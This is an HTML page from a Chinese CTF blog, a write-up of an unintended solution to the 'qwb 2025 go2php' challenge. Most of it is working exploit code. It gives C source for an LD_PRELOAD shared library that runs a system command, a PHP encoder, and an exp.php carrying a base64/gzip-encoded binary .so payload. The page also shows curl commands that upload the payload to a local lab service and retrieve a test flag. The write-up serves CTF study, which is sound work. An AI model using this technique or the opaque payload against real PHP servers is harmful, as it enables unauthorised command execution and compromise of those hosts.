@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>qwb 2025 go2php</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./qwb 2025 go2php.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">qwb 2025 go2php</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-10-21]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h2 id="fei-yu-qi">非预期</h2><p>没ban <code>putenv</code>，可以利用ld_preload劫持，同时对于利用的.so文件也不需要拥有可执行权限，可读即可。（phar可以保留执行权限）</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">// evil.c
+</span><span style="color:#65737e;">// gcc -shared -fPIC evil.c -o evil.so
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">init</span><span style="color:#c0c5ce;">() </span><span style="color:#b48ead;">__attribute__</span><span style="color:#c0c5ce;">((constructor));
+</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">init</span><span style="color:#c0c5ce;">() {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">unsetenv</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/catflag &gt; /var/www/html/flag.txt</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>gzip打包+base64编码</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#ab7967;">&lt;?php
+</span><span style="color:#65737e;">/**
+</span><span style="color:#65737e;"> * 读取文件 -&gt; gzip压缩 -&gt; base64编码
+</span><span style="color:#65737e;"> */
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// 配置
+</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">input_file </span><span style="color:#c0c5ce;">= &#39;</span><span style="color:#a3be8c;">evil.so</span><span style="color:#c0c5ce;">&#39;;  </span><span style="color:#65737e;">// 要处理的文件
+</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">output_file </span><span style="color:#c0c5ce;">= &#39;</span><span style="color:#a3be8c;">evil.so.b64</span><span style="color:#c0c5ce;">&#39;;  </span><span style="color:#65737e;">// 输出的base64文件（可选）
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// 读取文件
+</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!</span><span style="color:#96b5b4;">file_exists</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">input_file</span><span style="color:#c0c5ce;">)) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">die</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] File not found: </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">input_file</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">data </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">file_get_contents</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">input_file</span><span style="color:#c0c5ce;">);
+</span><span style="color:#65737e;">// gzip压缩
+</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">compressed </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">gzencode</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">);  </span><span style="color:#65737e;">// 9是最高压缩级别
+</span><span style="color:#65737e;">// base64编码
+</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">encoded </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">base64_encode</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">compressed</span><span style="color:#c0c5ce;">);
+</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">output_file</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">file_put_contents</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">output_file</span><span style="color:#c0c5ce;">, $</span><span style="color:#bf616a;">encoded</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">echo </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[+] Saved to: </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">output_file</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#ab7967;">?&gt;
+</span></pre>
+<p><code>exp.php</code>如下</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#ab7967;">&lt;?php
+</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">encoded </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">H4sIAAAAAAACA+1bW2wcRRatHnucCUnsDpsoJg8ysAQ5kLQHxwECsmPHrw6xk+DYErALnban7ZndeYSeHj8AQVAgIhuxChLwgfKx0mpR4Af+CB9IjgIhIKQNiA8ePxFShCOh3UE8FF5uqrrvnemqTNvsCgESdaSe0/fWPVXVXd1TNZpbj/T090YUhSBqSDupWIR0AKe2Bn23kiX082qyzoutJeG4K8ozUX1iumjAFvl+heegzmsvDn6BvyQ8B3V19Cht9u1SG89NEZ8TEV4XAV1M8+1YO88zCs8xkNfCcQLqE1nsvqg7C3EiX0d4xnu/74KT/H/a2wu6VigQeRPhGdu7k+rqyE8HDu8gtBc2DmqEZyXQrgrPTN/uYTYuM7Xe81opXwE2K7+h7q0N15/q/u598+nnn9v1r4f+ePKvH2F9SqDe/6X/8Sr+++hxZRW/EhI/HBK/KSS+lx7XVuuQYYxn8zmj4Ji2YxjE2Dk0YCQt2xpPFxzLHhroyuRz1pA5krH8suolxuiUaYylc2Ym/YBFirmC5Vi5CVKYpqFZkkmPjGqFvHYz6evfuaPLaNFatK3+1UXKB16vQqzAOBdXpxeztydP+PHF5y6x3OdLgn8b+Ek77y9BxWoH70f77Haf64SxPRfw1wT8HwT80YD/fMDPPd/QziL4TkDEAv5aIiEhISEhISEhIfHbxhcNV3+rH/osph+NnmomRH98xom45/RDr8dOe+Xu1rep293wDv1sWN/hxadYwcVPXNcdO+bZbMF98b2y7W44TKPHGtZ3+/W7G54V7L+Xbf3JtqdYu09G/8Zo2yVnJe2KBl1Z7J5vWH+QNXcamMabXvzWexhtnNOPlPRT/9mun7pUoytn9HfnnBW0gh80v4KYe95vB/Ws/YNt65rZT5Qbh/VDbR+xH/b6kQvOUv1o2xw1ZrfRC5lN0o8z0a+ordxLtZz+4iQtZCfDVEd7frKe1fDmbJy6qfkqmAo1j917OnCPy3dVQkJCQkJCQkJCQkJCQuKXRX+3sXewp39PZ7dvN4+azljGHI+3x5snTLt5cnKyOeVkM83MqTlTDo1R1tTc3kT8/7s++6/rMunakutmKG+i/Bjl6Oeue5z4/8kyKA8MEmVKVdYsXRQ7pvj/X6+lxz+oPsEC6tXe+sY7GpZMxg6S7au33bDlOu9vT6Zn9Z+gcWqg38z/Z9DHA35WJ+ujSfuxkTl66tXDka5ldftpw3K4JSQkJCQkJCQkJCR+R8C8S8yzxLxKzJm0gJeiAMqXgZkE3VVgY17nGj6crEZ9e+V3GQP+BvtqzvVSQ0uQTIk5mCchSRNzL1WwrwD7QeAlwI3AmNs5C/mbmKOZCPxeZFgEvAq4Kcr7U7V8P2eAFwvtzbl+/3WId8HG+1gCuxXKvwH718oRxXz1y54HGLAOYMyn7evqui3eNDxSzDnF+E1btC1aYvPNRc9sebilVUu0bgT3/O36+fqfu6J/qTdG9eSgyvvrwf+y4L8G/CXBf4vXxlWksYN/jru88xXl5w/xF6gH3wPEhBf/h/LzjHgmpP/fQz34Hm1c4HqPe2VXklL88ntULf5Fr/6G8vuGeNmrp7E8TojXPP/Ky8b5jPe5vJzPj/gQ6mkU6rng+VeV3yPEd15/rqi84Hi9SvW89XVK9Tz3REj89pD4oZD4nBKSFz9qOwWnODamjZJKOrzhZI1RlvZeIIaRzBvjmfyImTGSTt4uGGZxiozmswcylmMl6fNcNYIlyacN07bNacPKOfY0GbPNrGUki9nsNJUELINGOlyoNZHO0P4YRu9g50CP0bO7m2XssxpZY4W8kTJzSZaO33337s6BnV3U27d72OjRQaB3D1LX0EAXSvv69+zo7Df29Pbu6xkyhjp39PdQL2t33o0Aflp/RzCZX9hGgDsA+JifuH+AExGtMJ11zBHKju1zCs9yecfSxnNF7YCdP2DZznTANVJMZ5Kb00niWSmzkCJacjpHK/PZsf2SCcsupPM5zjBomW1lTBYIZwcyDtG8G8NOtfE8nBSsUaI51hQ1vXHQ7HzSdEyiWSkYy1TSrlh+Hf6g+go8p02Z2TStjFbtt+bXM1IoEI0+Vln6CPwM399rCL/3IGx/DxHmWYQm6MP2FVW+k3h00uNrOoehHudt5LWCTmx/F8zZEWFeRz5BKusAJaDH+XYfzPERYZ2A/GCVeSeIP8EcjXqcl5Hrhf5HBE7BnI82zvvI8ZD+Iyah7oiwzkCeCbl/eP2PQtkOYd2CnAjoV1XRHyWVPXDcQk3l129h439Y0MdVnsVlgFA9eUrQ71V5VhfQPyfo96s8xxfQ/1PQ47oD+ZMQPeIFQY/zMvKyBe7fS6Av7x2K89yywPv7iqAP26cX1v4bgn5/nOenF2j/3/CO1AjrftzHp4bokT+mR0NAX16XadXbE/WfEn4PV3kfJuhx/2VU0KmBdZwS0ON+sbPN839/lvefCXpcH82CvmkB/TeCHtdvamL+60e44EM9rtsaQ/Ti91+t4vvE9xT1N4bogxypMi/poH8iMA+srPL9s5jw++8Q5+DBP6LM3//lIfq7W+H9W0D/IxpKNdfoPAAA</span><span style="color:#c0c5ce;">&quot;;
+</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">compressed </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">base64_decode</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">encoded</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">data </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">gzdecode</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">compressed</span><span style="color:#c0c5ce;">);
+</span><span style="color:#96b5b4;">file_put_contents</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">/tmp/evil.so</span><span style="color:#c0c5ce;">&#39;, $</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">);
+</span><span style="color:#96b5b4;">putenv</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">LD_PRELOAD=/tmp/evil.so</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#96b5b4;">error_log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">trigger</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#ab7967;">?&gt;
+</span></pre>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">➜  go2php curl -X POST -F &quot;file=@exp.php&quot; http://127.0.0.1:6666/index.php
+</span><span style="color:#c0c5ce;">upload success: File uploaded to /home/ctf/c8719b1718b69e4a9d0c3b9b3052bf98.php% ➜  go2php curl -X POST -F &quot;file=@exp.php&quot; http://127.0.0.1:6666/flag.txt
+</span><span style="color:#c0c5ce;">QWBQWB{th1s_1s_a_test_f1ag}
+</span><span style="color:#c0c5ce;">
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#fei-yu-qi">非预期</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
